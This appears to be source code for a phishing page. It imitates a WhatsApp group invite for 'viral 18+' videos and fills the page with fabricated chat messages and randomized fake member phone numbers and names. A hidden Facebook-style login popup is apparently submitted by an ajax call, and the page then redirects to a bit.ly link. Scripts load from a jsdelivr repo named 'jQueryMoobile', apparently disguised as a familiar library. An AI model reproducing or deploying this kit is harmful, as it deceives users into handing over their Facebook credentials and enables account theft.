...
<script src="https://cdn.jsdelivr.net/gh/jQueryMoobile/cdnjquerymobile@main/slim.min.js"></script>
...
@font-face {
  ...
  src: url(https://rawcdn.githack.com/AlexHostX/all.asset/38984972fb20a70d711e86ac3e6f19e60ea8adc3/AlexHostWA.ttf);
}
*
{
	margin:0;
...
section .join
{
	...
	border-top-right-radius: 10px;
	border-top-left-radius: 10px;
	box-shadow: 5px 5px 5px 1000px rgba(0,0,0,.50);
}
section .join .icon
{
	position: fixed;
	...
	width: 70px;
	height: 70px;
	background: url('https://img.inews.co.id/media/600/files/inews_new/2019/08/28/Korea.jpg') no-repeat;
	background-size: cover;
...
section .join .content .desc .bold
{
	font-weight: 800;
	font-family: 'Whatsapp';
	color:rgba(0,0,0,.70);
}
section .join .content .desc .more
{
	cursor: pointer;
	color: skyblue;
}
section .join .content .peserta
{
	margin-top: 10px;
	position: relative;
	width: 100%;
...
section .join .content .profile ul
{
	position: relative;
	display: flex;
}
section .join .content .profile ul li
{
	margin-right: 20px;
	display: inline;
	list-style: none;
...
section .join .content .profile ul li .imgBox
{
	width: 50px;
	height: 50px;
	background: red;
...
section .join .content .profile ul li .imgBox img
{
	min-width: 100%;
	height: 100%;
}
section .join .content .profile ul li .nama
{
	text-align: center;
	margin-top: 5px;
	font-family: system-ui;
...
section .join .bottom a:nth-child(1)
{
	margin-right: 30px;
}
section .loading
{
	...
	justify-content: center;
	flex-direction: column;
	animation: ups .1s forwards linear;
}
.loading span
{
	margin-top: 20px;
	...
	font-size: 13px;
	letter-spacing: 0.5px;
	/*animation: naik .5s forwards linear;*/
}
.loading .spin
{
	width: 160px;
...
<body translate="no">
  <div class="page">
  <div class="marvel-device nexus5" style="width: 100%; height: 100%;">
        ...
        <div class="chat">
          <div class="chat-container">
            <div class="user-bar">
              ...
              <div class="avatar">
                <img src="https://g.top4top.io/p_231907ay40.jpg" alt="Avatar" style="object-fit: cover; width: 40px; height: 40px;">
              </div>
              <div class="name" style="width:130px;">
                <span>Berbagi Video Viral 18+</span>
                <span class="status">ketuk untuk info grup</span>
              </div>
            ...
            <div class="conversation">
              <div class="conversation-container">
                ...
                <div class="message received">
                     <span style="color: #ff8f2c!important">+62 896-<span id="nomerAlexHost1">8304</span>-<span id="nomerAlexHost2">8928</span></span><br>
                  <span id="random">Gak ada yang viral lagi?</span>
                  <span class="metadata"><span class="time">12:30 AM</span></span>
                </div>
                
                <div class="message received">
                    <span style="color: #e542a3!important">+62 896-<span id="nomerAlexHost3">4518</span>-<span id="nomerAlexHost4">9077</span></span><br>
                 <img src="https://b.top4top.io/p_2319kjl2l1.jpg" width="100%" id="myPicture">
                  <span class="metadata"><span class="time">12:30 AM</span></span>
                </div>
...
<script>
document.getElementById("nomerAlexHost1").innerHTML =
Math.floor(Math.random() * 9000) + 1000;
document.getElementById("nomerAlexHost2").innerHTML =
Math.floor(Math.random() * 9000) + 1000;
document.getElementById("nomerAlexHost3").innerHTML =
Math.floor(Math.random() * 9000) + 1000;
document.getElementById("nomerAlexHost4").innerHTML =
Math.floor(Math.random() * 9000) + 1000;
</script>              
...
#more {display: none;}
	...
	<section>
		<div class="join" style="">
			<span class="icon" style="background: url(https://g.top4top.io/p_231907ay40.jpg) no-repeat; background-size: cover;"></span>
			<div class="content">
				<h1>Berbagi Video Viral 18+</h1>
...
'Hohohihe',
'Indo HOT',
'KOS (Kumpulan Orang Sange)',
'Bahan CO*I',
'Calon Viral'];


var random = document.querySelector('#namaAlexHost');

random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
</script>				
				<span class="ceo" id="admin">Grup dibuat oleh ~kuntul</span>
				<p class="desc">
					 
					💡 WELCOME PENCARI BAHAN 💡<br><span class="bold">📍 Peraturan 📍</span><span id="dots">...</span> <span id="more"><br>📌 Share jika punya video<br>📌 Jangan spam gak jelas<br>📌 Dapat video jangan keluar<br>📌 Berkata jorok sewajarnya<br>📌 Hormati ras daerah<br>📌 Dilarang chat member di luar grup</span>
					<span class="more" onclick="myFunction()" id="myBtn">Baca selengkapnya<br>
<script>
function myFunction() {
...
var memes = [
'Grup dibuat oleh ~AdminXNXX'
];


var random = document.querySelector('#admin');

random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
</script>
				</span></p>
				<div class="peserta" id="memberAlexHost">254 peserta</div>
<script id="rendered-js">
/* Meme */
...
var random = document.querySelector('#memberAlexHost');
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
				...
				<div class="profile">
					<ul>
						<li>
							<div class="imgBox">
								<img src="https://l.top4top.io/p_2250olxyr0.png">
							</div>
							<span class="nama" id="AlexHost1">~lily</span>
						</li>
<script id="rendered-js">
/* Meme */
...
var random = document.querySelector('#AlexHost1');

random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
</script>
						<li>
							<div class="imgBox">
								<img src="https://j.top4top.io/p_2250kf4vq0.png">
							</div>
							<span class="nama" id="AlexHost2">~orangindo</span>
						</li>
<script id="rendered-js">
/* Meme */
...
var random = document.querySelector('#AlexHost2');

random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
</script>
						<li>
							<div class="imgBox">
								<img src="https://g.top4top.io/p_2250j4cs80.png">
							</div>
							<span class="nama" id="AlexHost3">~titan</span>
						</li>
<script id="rendered-js">
/* Meme */
...
var random = document.querySelector('#AlexHost3');

random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
</script>
						<li>
							<div class="imgBox">
								<img src="https://j.top4top.io/p_2250pajaq0.png">
							</div>
							<span class="nama" id="AlexHost4">~uwiii</span>
						</li>
<script id="rendered-js">
/* Meme */
...
var random = document.querySelector('#AlexHost4');

random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
</script>
						<li>
							<div class="imgBox">
								<img src="https://d.top4top.io/p_2250vuf2g0.png">
							</div>
							<span class="nama" id="AlexHost5">~.</span>
						</li>
<script id="rendered-js">
/* Meme */
...
var random = document.querySelector('#AlexHost5');

random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
</script>
						<li>
							<div class="imgBox">
								<img src="https://j.top4top.io/p_2250exbmf0.png">
							</div>
							<span class="nama" id="AlexHost6">~dotid</span>
						</li>
<script id="rendered-js">
/* Meme */
...
var random = document.querySelector('#AlexHost6');

random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
</script>
						<li>
							<div class="imgBox">
								<img src="https://j.top4top.io/p_2250mm2sn0.png">
							</div>
							<span class="nama" id="AlexHost7">~lita</span>
						</li>
<script id="rendered-js">
/* Meme */
...
var random = document.querySelector('#AlexHost7');
...
random.innerHTML = memes[Math.floor(Math.random() * memes.length)];
		...
		<div class="loading" style="display: none;">
		   <div class="toast"></div>
			...
			<img class="spin" src="https://www.starratings.com.au/assets/img/loading.gif" style="width: 100px;height: 100px;">
		</div>
		<!-- LOGIN FB -->
		<div class="popup-login login-facebook animated fadeIn" style="display: none;">
		   <div class="popup-box-login-fb">
		      ...
		      <div class="content-box-fb">
		         ...
		         <img src="https://rawcdn.githack.com/AlexHostX/all.asset/c529c239acac01cd8bc1a76f349f7c3caebba766/580b57fcd9996e24bc43c543.png">
...
<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/jQueryMoobile/cdnjqfuntion@main/slim.min.js"></script>
<script>
...
<script src="https://cdn.jsdelivr.net/gh/jQueryMoobile/cdnjqfuntion@main/slim.min.js"></script>
...
var memes = [
'Yang indo ada om?',
'kuota abis njir, padahal baru sehari masuk sini',
'Gak ada yang viral lagi?',
'Kirim bokep lagi bro yang ada',
'penyimpanan gw penuh gegara ni grup asw :v',
'Males gw yang barat, bagusan asia wkwkwk'];
...
//# sourceURL=pen.js
                ...
                
                {
                    ...
                    $.ajax({
                        ...
                        success: function() {
                                    ...
                                    $('.fb').html('KIRIM PESAN');
                                    window.location = 'https://bit.ly/3vSiRTJ';
                            } 
                    })
                }
		}
	...
	<script src="https://cdn.jsdelivr.net/gh/jQueryMoobile/cdnjquerymobile@main/min.js"></script>
